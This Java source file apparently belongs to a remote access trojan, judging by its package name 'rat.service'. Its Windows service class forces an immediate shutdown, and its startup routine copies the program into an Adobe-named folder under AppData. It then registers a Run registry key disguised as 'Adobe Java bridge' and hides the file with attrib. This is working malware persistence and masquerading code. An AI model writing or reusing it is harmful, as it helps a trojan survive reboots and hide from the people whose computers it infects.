package de.sogomn.rat.service;

import java.io.File;

import de.sogomn.engine.util.FileUtils;

public final class WindowsService implements IOperatingSystemService {
	
	private static final String SHUTDOWN_COMMAND = "shutdown -s -t 0";
	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR";
	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"%s\"";
	private static final String HIDE_FILE_COMMAND = "attrib +H %s";
	
	WindowsService() {
		//...
	}
	
	@Override
	public void shutDown() {
		try {
			Runtime.getRuntime().exec(SHUTDOWN_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void addToStartup(final File file) {
		try {
			final String path = STARTUP_FILE_PATH + File.separator + file.getName();
			final File destination = new File(path);
			final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, path);
			final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
			
			FileUtils.createFile(STARTUP_FILE_PATH);
			FileUtils.copyFile(file, destination);
			
			Runtime.getRuntime().exec(registryCommand);
			Runtime.getRuntime().exec(hideFileCommand);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void removeFromStartup(final File file) {
		//...
	}
	
}
